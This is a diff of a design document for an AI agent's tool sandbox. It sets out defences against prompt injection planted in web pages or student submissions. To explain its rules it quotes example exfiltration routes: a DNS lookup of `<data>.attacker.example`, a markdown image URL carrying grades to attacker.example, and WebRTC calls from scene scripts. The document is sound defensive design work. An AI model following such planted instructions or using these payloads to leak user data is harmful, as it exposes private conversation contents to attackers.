@@ -34,23 +34,27 @@ audio inside a tool result, so audio never comes back as one.
 The model may follow instructions planted in a web page or a student's submission, and the code
 it writes may too. Three rules keep the conversation's data in:
 
-- The sandbox holds no credentials and reaches no network but the package index. Exa, Modal and
-  provider keys, and the user's identity for `mcp`, stay on the host.
+- The sandbox holds no credentials and has no network. Modal's domain allowlist would leave DNS
+  open, and a lookup of `<data>.attacker.example` carries data out, so the image carries every
+  package the tools and skills need instead. Exa, Modal and provider keys, and the user's
+  identity for `mcp`, stay on the host.
 - `fetch_url` reads only URLs the user wrote or Exa returned, close to Anthropic's rule for its
   own web fetch tool, so the model can't build a URL that carries data out. URLs in other tools'
   output don't count: the model can print any URL with `bash`.
 - The browser never loads a URL the model wrote. The UI shows images in answers and widgets only
-  from the files origin, where the caller hosts what the tools made. It serves files from that
-  separate origin, HTML and SVG only as downloads, and interactive scenes with no network at all.
-  Otherwise a markdown image like `![](https://attacker.example/?d=<grades>)` would send data out
-  the moment it renders.
+  from the files origin, where the caller hosts what the tools made, and the app page's content
+  security policy enforces it (`img-src`, and `script-src` without `'unsafe-inline'`). Files come
+  from that separate origin, HTML and SVG only as downloads; a diagram's SVG renders as an
+  `<img>` with a `data:` URI, where SVG runs no script and loads nothing. Otherwise a markdown
+  image like `![](https://attacker.example/?d=<grades>)` would send data out the moment it
+  renders.
 
 Every path, including the ones host tools take, names a file in the sandbox.
 
 ## Running tools
 
-The caller holds one `Toolbox` per conversation. It lists the tools for the config and runs the
-model's calls:
+The caller builds a `Toolbox` for each request of a conversation. It lists the tools for the
+config and runs the model's calls:
 
 ```python
 from agent import Toolbox
@@ -72,8 +76,12 @@ await box.aclose()
 ```
 
 On the next request, the reply finishes the waiting call before anything else joins the history:
-`result = await box.resume(call["name"], call["arguments"], reply)`.
+`result = await box.resume(call["name"], call["arguments"], reply)`. A request that brings no
+reply, such as a new message instead of an answer, declines every waiting call first: None for a
+question, false for an approval.
 
+- The caller runs one request per conversation at a time. The one-at-a-time rule for sandbox
+  changes lives in the toolbox, so two requests at once could race on the same files.
 - The first argument is the conversation's id, which names its sandbox and volume.
 - `box.specs` lists the built-in tools, then the caller's own, as openai function dicts.
 - A custom tool is a plain Python function, sync or async. Its schema comes from its signature
@@ -109,9 +117,9 @@ On the next request, the reply finishes the waiting call before anything else jo
   and passes them back when it rebuilds the toolbox. A source seen before keeps its number: a
   page by its URL, a file passage by its path and page, which its part carries in
   `providerMetadata`.
-- `urls` are the URLs in the user's messages. With the URLs Exa returns, they are all that
-  `fetch_url` reads; both come back on a rebuild, `urls` from the messages and Exa's from
-  `sources`.
+- `urls` are the URLs the user typed in their messages, not ones inside attachments. With the
+  URLs Exa returns, they are all that `fetch_url` reads; both come back on a rebuild, `urls` from
+  the messages and Exa's from `sources`.
 - `llm` is llm_master's facade, for the `generate_*` pair. `mcp` and `file_search` will add the
   user's identity and file scope when they are built.
 - `aclose()` closes the toolbox's HTTP clients. The sandbox outlives it.
@@ -119,8 +127,9 @@ On the next request, the reply finishes the waiting call before anything else jo
 ## Shapes
 
 Each tool copies a precedent the models already know, chosen once for every provider. The
-tables give each parameter; the JSON schemas in `agent/` are the exact spelling. A value a tool
-can't take, such as a timeout over 600 seconds, is an error result.
+tables give each parameter; the JSON schemas in `agent/` are the exact spelling, written by hand
+to keep the precedents' wording, and a test keeps each in step with its function's parameters. A
+value a tool can't take, such as a timeout over 600 seconds, is an error result.
 
 Rules every tool shares:
 
@@ -437,9 +446,9 @@ once the result succeeds, the way it draws `todo`, so no extra stream part is ne
 
 An interactive scene is one component whose prop names an HTML file the model built in the
 sandbox. The tool snapshots that file into the result's `files`, named by its path, so the
-browser finds the hosted copy from the prop and later edits don't change a scene already shown. The caller serves it from a separate origin under a policy that blocks every
-network request, since even an image URL could carry data out, and shows it in a sandboxed
-frame.
+browser finds the hosted copy from the prop and later edits don't change a scene already shown. The caller serves it from a separate origin under a policy that blocks
+network requests (`default-src 'none'`), since even an image URL could carry data out, and shows
+it in a sandboxed frame whose parent pins `frame-src` to that origin.
 
 ## Files
 
@@ -477,6 +486,9 @@ audio needs a transcription call, which SPEC.md doesn't have yet.
 - A planted instruction can still put data into a search query, which reaches Exa, not the
   attacker. The read-only rule for `mcp` and the seen-URL rule for `fetch_url` close the direct
   routes out, not every route.
+- Routes that need the user remain: a markdown link the user clicks, and a downloaded HTML file
+  the user opens. A scene's script can also reach the network through WebRTC, which no content
+  security policy covers, so scenes rely on the model not being told to.
 - A short audio upload goes into the user message as audio, which Anthropic, OpenAI's Responses
   API and Fireworks don't take (IO.md). From then on only Gemini and OpenAI's audio models can
   answer.
